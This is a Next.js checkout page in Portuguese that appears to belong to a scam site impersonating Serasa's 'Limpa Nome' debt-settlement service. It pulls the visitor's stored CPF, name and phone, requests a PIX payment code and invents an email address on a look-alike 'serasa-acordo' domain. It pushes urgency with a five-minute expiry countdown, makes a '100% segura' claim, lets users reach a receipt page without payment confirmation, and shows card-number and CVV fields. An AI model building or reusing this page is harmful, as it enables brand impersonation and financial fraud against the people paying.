'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function Checkout() {
  const [method, setMethod] = useState('pix');
  const [discountedVal, setDiscountedVal] = useState(557.77);
  const [pixCode, setPixCode] = useState('Gerando código...');
  const [qrCodeUrl, setQrCodeUrl] = useState('');
  const [timer, setTimer] = useState('05:00');
  const [isQrOverlayActive, setIsQrOverlayActive] = useState(false);
  const router = useRouter();

  useEffect(() => {
    const disc = parseFloat(localStorage.getItem('debt_discounted') || 557.77);
    setDiscountedVal(disc);
    generatePix(disc);
  }, []);

  const generatePix = async (amount) => {
    const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
    const amountCents = Math.round(amount * 100);

    setPixCode('Processando seu PIX...');

    try {
      const response = await fetch('/api/create-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: amountCents,
          customer: {
            name: userData.NOME || 'Cliente Serasa',
            email: userData.EMAIL || `${userData.CPF || 'cliente'}@serasa-acordo.com.br`,
            phone: userData.TELEFONE || '11999999999',
            document: {
              number: userData.CPF || '00000000000',
              type: 'CPF'
            }
          },
          items: [{
            title: 'Acordo Serasa Limpa Nome',
            unit_price: amountCents,
            quantity: 1,
            tangible: false
          }]
        })
      });

      const data = await response.json();

      if (data.pix) {
        setPixCode(data.pix.copy_paste);
        setQrCodeUrl(`https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pix.copy_paste)}`);
        
        setTimeout(() => setIsQrOverlayActive(true), 15000);
        startTimer(300);
      } else {
        console.error('Pix data missing:', data);
        setPixCode('Erro: Chave PIX não gerada. Recarregue a página.');
      }
    } catch (error) {
      console.error('Error:', error);
      setPixCode('Erro ao conectar com o banco. Tente novamente.');
    }
  };

  const startTimer = (duration) => {
    let t = duration;
    const interval = setInterval(() => {
      let m = parseInt(t / 60, 10);
      let s = parseInt(t % 60, 10);
      setTimer(`${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`);
      if (--t < 0) clearInterval(interval);
    }, 1000);
  };

  const copyPix = () => {
    navigator.clipboard.writeText(pixCode).then(() => {
      alert('Código PIX copiado!');
    });
  };

  return (
    <div className="bg-light min-h-screen">
      <header className="main-header">
        <div className="container text-center">
          <h3 className="text-white font-bold py-2">Finalizar Pagamento</h3>
        </div>
      </header>

      <main className="container max-w-xl py-8">
        <div className="card shadow-lg">
          <div className="text-center mb-8">
            <p className="text-muted small">Total a pagar:</p>
            <h2 className="text-4xl font-bold text-primary">
              {discountedVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}
            </h2>
          </div>

          <div className="payment-methods mb-8">
            <div className={`method-card ${method === 'pix' ? 'active' : ''}`} onClick={() => setMethod('pix')}>
              <div className="method-info">
                <h4 className="font-bold">PIX Copia e Cola</h4>
                <p className="small text-muted">Aprovação imediata e baixa automática.</p>
              </div>
              <div className="method-badge">RECOMENDADO</div>
            </div>
            <div className={`method-card ${method === 'card' ? 'active' : ''}`} onClick={() => setMethod('card')}>
              <div className="method-info">
                <h4 className="font-bold">Cartão de Crédito</h4>
                <p className="small text-muted">Parcele em até 12x (liberação em 24h).</p>
              </div>
            </div>
          </div>

          {method === 'pix' && (
            <div className="pix-area">
              <div className="pix-timer mb-6 flex items-center justify-center gap-2">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                Esta oferta expira em: <span>{timer}</span>
              </div>
              
              <div className="qr-code-wrapper mb-8">
                <div className="qr-code">
                  {qrCodeUrl ? (
                    <img src={qrCodeUrl} alt="QR Code PIX" />
                  ) : (
                    <div className="flex items-center justify-center h-full text-muted small">Gerando QR Code...</div>
                  )}
                </div>
                {isQrOverlayActive && (
                  <div className="qr-overlay active flex-col gap-2">
                    <div className="loader" style={{width: '30px', height: '30px', borderTopColor: 'var(--secondary-color)'}}></div>
                    <span className="small">Aguardando pagamento...</span>
                  </div>
                )}
              </div>

              <div className="mb-6">
                <p className="text-center small text-muted mb-2">Toque no código abaixo para copiar:</p>
                <div className="copy-box" onClick={copyPix}>{pixCode}</div>
              </div>

              <button className="btn-primary w-full py-4 btn-pulse" onClick={() => router.push('/comprovante')}>
                JÁ REALIZEI O PAGAMENTO
              </button>
              
              <p className="mt-6 text-center text-muted small flex items-center justify-center gap-1">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                Transação 100% segura via SSL
              </p>
            </div>
          )}

          {method === 'card' && (
            <div className="card-area active">
              <div className="flex flex-col gap-4">
                <div className="form-group">
                  <label>Número do Cartão</label>
                  <input type="text" placeholder="0000 0000 0000 0000" className="w-full" />
                </div>
                <div className="flex gap-4">
                  <div className="form-group flex-1">
                    <label>Validade</label>
                    <input type="text" placeholder="MM/AA" />
                  </div>
                  <div className="form-group flex-1">
                    <label>CVV</label>
                    <input type="password" placeholder="***" maxLength="3" className="w-full p-4 border rounded-lg" />
                  </div>
                </div>
                <button className="btn-primary w-full py-4">FINALIZAR PAGAMENTO NO CARTÃO</button>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
